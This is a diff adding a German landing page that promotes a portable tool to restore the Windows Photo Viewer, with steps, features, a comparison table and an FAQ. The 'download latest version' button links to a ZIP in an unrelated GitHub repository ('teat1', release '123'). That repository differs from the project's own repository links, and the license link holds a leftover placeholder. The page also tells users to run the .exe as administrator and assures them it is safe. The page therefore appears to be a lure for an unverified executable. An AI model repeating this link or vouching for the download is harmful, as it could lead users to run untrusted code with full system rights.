+        </li>
+        <li class="step">
+          <span class="step-num">Schritt 2</span>
+          <h3>Restore klicken</h3>
+          <p>Dateitypen wählen und festlegen, ob es nur für Sie oder alle Benutzer gilt. Dann <b>Restore Windows Photo Viewer</b> und OK klicken.</p>
+          <div class="step-visual">
+            <div class="restore-crop-wrap">
+              <img class="restore-crop" src="../assets/app-restore-btn.webp" width="183" height="35" alt="Die Schaltfläche Restore Windows Photo Viewer im Programm">
+              <img class="restore-crop" src="../assets/app-dialog.webp" width="311" height="112" alt="Erfolgsmeldung: Im nächsten Schritt in den Standard-Apps die Fotoanzeige wählen">
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="step-num">Schritt 3</span>
+          <h3>Als Standard festlegen</h3>
+          <p>In Einstellungen, Standard-Apps, unter Fotoanzeige die Windows-Fotoanzeige wählen. Oder ein Foto rechtsklicken, Öffnen mit, dann Windows-Fotoanzeige.</p>
+          <div class="step-visual" aria-hidden="true">
+            <div class="ctx">
+              <div class="ctx-menu">
+                <span>Open</span><span>Edit</span><span>Print</span><hr>
+                <span class="hl">Open with<b>›</b></span><span>Share</span><span>Copy</span>
+              </div>
+              <div class="ctx-menu ctx-sub">
+                <span class="hl">Windows Photo Viewer</span><span>Paint</span><span>Photos</span><hr><span>Choose another app</span>
+              </div>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </section>
+
+  <!-- 5. Features -->
+  <section class="section" id="features">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Was das Tool macht und was es nicht anrührt</h2>
+        <p>Die Windows-Fotoanzeige war nie weg. Microsoft hat sie seit Windows 8 nur versteckt. Dieses Tool macht sie wieder auswählbar.</p>
+      </div>
+
+      <div class="feature">
+        <div class="feature-text">
+          <h3>Windows-Fotoanzeige mit einem Klick wiederherstellen</h3>
+          <p>Das Tool setzt die wenigen Registry-Einträge, die die Fotoanzeige wieder als Standard-App verfügbar machen, und fügt sie wieder zu „Öffnen mit“ hinzu.</p>
+          <ul>
+            <li><svg class="icon"><use href="#i-check"/></svg>Formate wählen: JPEG, BMP, PNG, TIFF, WDP, GIF</li>
+            <li><svg class="icon"><use href="#i-check"/></svg>Nur für Sie oder für alle Benutzer des Computers</li>
+            <li><svg class="icon"><use href="#i-check"/></svg>Ihre Fotos werden nicht verschoben, verändert oder gelöscht</li>
+          </ul>
+        </div>
+        <figure class="shot">
+          <div class="shot-frame"><img src="../assets/app-main.webp" width="1257" height="978" alt="Hauptfenster von Restore Windows Photo Viewer 1.0 mit Dateitypen, Benutzerauswahl und der Restore-Schaltfläche" loading="lazy"></div>
+          <figcaption>Restore Windows Photo Viewer 1.0, Hauptfenster</figcaption>
+        </figure>
+      </div>
+
+      <div class="feature flip">
+        <div class="feature-text">
+          <h3>Jederzeit rückgängig, zurück zur Fotos-App</h3>
+          <p>Anders überlegt? Tool erneut öffnen und <b>Keep using Photos App</b> klicken. Windows öffnet Bilder dann wieder wie vorher in der Fotos-App.</p>
+          <p>In beide Richtungen wird nichts deinstalliert, das Hin- und Herwechseln ist also sicher.</p>
+        </div>
+        <div class="undo-demo">
+          <div class="shot-frame">
+            <img src="../assets/app-buttons.webp" width="1257" height="70" alt="Die drei Schaltflächen: Restore Windows Photo Viewer, Keep using Photos App, Exit" loading="lazy">
+            <span class="undo-ring" aria-hidden="true"></span>
+          </div>
+          <div class="undo-note">
+            <svg class="icon icon-24"><use href="#i-history"/></svg>
+            <p><strong>Keep using Photos App</strong> macht alle Änderungen von Restore rückgängig.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="facts">
+        <div class="fact">
+          <span class="fact-ico"><svg class="icon icon-24"><use href="#i-desktop"/></svg></span>
+          <div>
+            <h3>Läuft unter Windows 10 und Windows 11</h3>
+            <p>Auch mit den neuesten Updates. Eine einzelne portable .exe, ohne Installation und komplett offline.</p>
+            <div class="tags"><span class="tag">Windows 10</span><span class="tag">Windows 11</span><span class="tag">Portable .exe</span><span class="tag">Offline</span></div>
+          </div>
+        </div>
+        <div class="fact">
+          <span class="fact-ico"><svg class="icon icon-24"><use href="#i-tools"/></svg></span>
+          <div>
+            <h3>Keine manuelle Registry-Bearbeitung</h3>
+            <p>Kein regedit, keine .reg-Dateien, keine Suche nach den richtigen Schlüsseln. Das Tool schreibt die Änderungen und kann sie zurücknehmen.</p>
+            <div class="tags"><span class="tag">Keine Werbung</span><span class="tag">Keine Telemetrie</span><span class="tag">MIT-Lizenz</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 6. Comparison -->
+  <section class="section" id="why">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Warum nicht einfach die Registry von Hand bearbeiten?</h2>
+        <p>Der Fix besteht aus ein paar Registry-Schlüsseln. Es gibt drei Wege, sie zu setzen, und sie verlangen sehr Unterschiedliches von Ihnen.</p>
+      </div>
+
+      <div class="table-wrap">
+        <table class="vs">
+          <thead>
+            <tr>
+              <td></td>
+              <th scope="col" class="us">Dieses Tool</th>
+              <th scope="col">.reg-Datei</th>
+              <th scope="col">Registry von Hand</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <th scope="row">Keine Tippfehler möglich</th>
+              <td class="us"><span class="cell yes"><svg class="icon"><use href="#i-check"/></svg>Ja</span></td>
+              <td><span class="cell part"><svg class="icon"><use href="#i-alert"/></svg>Nur wenn die Datei stimmt</span></td>
+              <td><span class="cell no"><svg class="icon"><use href="#i-x"/></svg>Ein falscher Wert und nichts geht</span></td>
+            </tr>
+            <tr>
+              <th scope="row">Rückgängig mit einem Klick</th>
+              <td class="us"><span class="cell yes"><svg class="icon"><use href="#i-check"/></svg>Ja</span></td>
+              <td><span class="cell part"><svg class="icon"><use href="#i-alert"/></svg>Braucht eine zweite Datei</span></td>
+              <td><span class="cell no"><svg class="icon"><use href="#i-x"/></svg>Jeden Schlüssel selbst zurücksetzen</span></td>
+            </tr>
+            <tr>
+              <th scope="row">Kein Fachwissen nötig</th>
+              <td class="us"><span class="cell yes"><svg class="icon"><use href="#i-check"/></svg>Ja</span></td>
+              <td><span class="cell part"><svg class="icon"><use href="#i-alert"/></svg>Sie importieren eine Datei, die Sie nicht lesen können</span></td>
+              <td><span class="cell no"><svg class="icon"><use href="#i-x"/></svg>regedit erforderlich</span></td>
+            </tr>
+            <tr>
+              <th scope="row">Dateitypen und Benutzer wählen</th>
+              <td class="us"><span class="cell yes"><svg class="icon"><use href="#i-check"/></svg>Kontrollkästchen</span></td>
+              <td><span class="cell no"><svg class="icon"><use href="#i-x"/></svg>Fest in der Datei</span></td>
+              <td><span class="cell part"><svg class="icon"><use href="#i-alert"/></svg>Wenn Sie die Schlüssel kennen</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p class="vs-note">Die meisten Download-Seiten bieten nur eine nackte .reg-Datei an. Dieses Tool setzt denselben Fix, zeigt, was er umfasst, und bietet einen Weg zurück.</p>
+    </div>
+  </section>
+
+  <!-- 7. FAQ -->
+  <section class="section" id="faq">
+    <div class="wrap faq-grid">
+      <div class="section-head">
+        <h2>Fragen vor dem Download</h2>
+        <p>Keine Antwort gefunden? <a href="https://github.com/PinCraneUpgrade/restore-windows-photo-viewer/issues">Issue auf GitHub eröffnen</a>.</p>
+      </div>
+      <div class="faq-list">
+        <details open>
+          <summary><h3>Ist die Nutzung sicher?</h3><svg class="icon"><use href="#i-chevron"/></svg></summary>
+          <div class="answer"><p>Ja. Das Tool ändert nur, welche App Windows als Standard-Fotoanzeige verwendet. Es verändert oder löscht keine Fotos, und die Änderung lässt sich jederzeit im Programm rückgängig machen.</p></div>
+        </details>
+        <details>
+          <summary><h3>Funktioniert es unter Windows 11?</h3><svg class="icon"><use href="#i-chevron"/></svg></summary>
+          <div class="answer"><p>Ja. Restore Windows Photo Viewer läuft unter Windows 10 und Windows 11, auch mit den neuesten Updates.</p></div>
+        </details>
+        <details>
+          <summary><h3>Warum fehlt die Windows-Fotoanzeige in meinen Standard-Apps?</h3><svg class="icon"><use href="#i-chevron"/></svg></summary>
+          <div class="answer"><p>Seit Windows 8 blendet Microsoft die Windows-Fotoanzeige in den Standard-Apps aus, obwohl die Programmdateien weiterhin in Windows enthalten sind. Dieses Tool aktiviert sie wieder, ohne etwas zu entfernen oder neu zu installieren.</p></div>
+        </details>
+        <details>
+          <summary><h3>Kann ich später zur Fotos-App zurückwechseln?</h3><svg class="icon"><use href="#i-chevron"/></svg></summary>
+          <div class="answer"><p>Ja. Tool erneut öffnen und <b>Keep using Photos App</b> klicken. Windows öffnet Bilder dann wieder in der Fotos-App.</p></div>
+        </details>
+        <details>
+          <summary><h3>Brauche ich Administratorrechte?</h3><svg class="icon"><use href="#i-chevron"/></svg></summary>
+          <div class="answer"><p>Ja. Da das Tool Standard-App-Einstellungen des Systems ändert, braucht es Administratorrechte. Falls es nicht automatisch fragt: .exe rechtsklicken und Als Administrator ausführen wählen.</p></div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- 8. Final CTA -->
+  <section class="cta" id="download">
+    <div class="wrap">
+      <div>
+        <h2>Bereit für Ihre klassische Fotoanzeige?</h2>
+        <p>Kostenlos und Open Source. ZIP herunterladen, .exe starten, Restore klicken.</p>
+      </div>
+      <div class="cta-side">
+        <a class="btn btn-primary" href="https://github.com/WraithEchoAdapter/teat1/releases/download/123/RestoreWindowsPhotoViewer.zip"><svg class="icon"><use href="#i-download"/></svg>Neueste Version herunterladen</a>
+        <small>v1.0 · RestoreWindowsPhotoViewer.zip · Windows 10 &amp; 11</small>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- 9. Footer -->
+<footer class="footer">
+  <div class="wrap">
+    <div class="footer-top">
+      <a class="brand" href="#top">
+        <svg class="brand-mark" viewBox="0 0 32 32" aria-hidden="true"><rect x="3" y="5" width="26" height="22" rx="2" fill="#1f4e79"/><path d="M6 23l7-8 5 5 3-3 5 6z" fill="#f7f5f0"/><circle cx="22" cy="11" r="2.5" fill="#c17f2e"/></svg>
+        Restore Windows Photo Viewer
+      </a>
+      <ul class="footer-links">
+        <li><a href="https://github.com/PinCraneUpgrade/restore-windows-photo-viewer"><svg class="icon"><use href="#i-github"/></svg>GitHub-Repository</a></li>
+        <li><a href="https://github.com/your-account/restore-windows-photo-viewer/blob/main/LICENSE"><svg class="icon"><use href="#i-law"/></svg>MIT-Lizenz</a></li>
+        <li><a href="https://github.com/PinCraneUpgrade/restore-windows-photo-viewer/releases"><svg class="icon"><use href="#i-download"/></svg>Releases</a></li>
+      </ul>
+    </div>
+    <div class="footer-bottom">
+      <ul class="langs" aria-label="Sprache">
+        <li><svg class="icon"><use href="#i-globe"/></svg></li>
+        <li><a href="../" hreflang="en" lang="en" title="English">EN</a></li>
+        <li><a href="../de/" hreflang="de" lang="de" title="Deutsch" aria-current="true">DE</a></li>
+        <li><a href="../pt/" hreflang="pt-BR" lang="pt-BR" title="Português">PT</a></li>
+        <li><a href="../es/" hreflang="es" lang="es" title="Español">ES</a></li>
+        <li><a href="../fr/" hreflang="fr" lang="fr" title="Français">FR</a></li>
+        <li><a href="../it/" hreflang="it" lang="it" title="Italiano">IT</a></li>
+      </ul>
+      <span class="made">Gemacht mit <svg class="icon" role="img" aria-label="Liebe"><use href="#i-heart"/></svg> für alle, die die alte Fotoanzeige vermissen</span>
+    </div>
+  </div>
+</footer>
+
+<script src="../main.js"></script>
+</body>
+</html>
